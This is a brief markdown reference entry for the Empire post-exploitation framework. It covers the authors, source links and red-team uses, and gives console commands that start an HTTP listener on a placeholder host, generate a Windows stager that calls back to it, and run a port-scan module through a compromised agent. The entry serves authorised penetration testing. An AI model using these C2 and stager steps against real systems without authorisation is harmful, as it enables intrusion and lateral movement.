# Empire

## Description
Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. It is the merge of the previous PowerShell Empire and Python EmPyre projects.

## Authors
Will Schroeder (@harmj0y), Justin Warner (@sixdub), Matt Nelson (@enigma0x3), @xorrior, and others.

## Source
- GitHub: https://github.com/BC-SECURITY/Empire
- Official Website: https://www.bc-security.org/post/the-empire-3-0-strikes-back

## Usage by Security Engineers
Security engineers use Empire to:
- Perform post-exploitation activities
- Execute PowerShell agents without powershell.exe
- Leverage encrypted communication with the Empire listeners
- Conduct lateral movement within a network

## Useful Situations
Empire is particularly useful for:
- Red team operations
- Penetration testing
- Simulating advanced persistent threats (APTs)
- Testing endpoint detection and response (EDR) solutions

## Example Commands
1. Start Empire:
   ```
   ./empire
   ```

2. Start a listener:
   ```
   listeners
   uselistener http
   set Host http://example.com
   execute
   ```

3. Generate a stager:
   ```
   usestager windows/launcher_bat
   set Listener http
   generate
   ```

4. Use a module:
   ```
   usemodule situational_awareness/network/portscan
   set Agent AGENT_NAME
   run
   ```

5. View active agents:
   ```
   agents
   ```

## Installation
To install Empire using Homebrew on macOS:

```
brew install empire
```

For other installation methods, please refer to the official Empire documentation on GitHub.
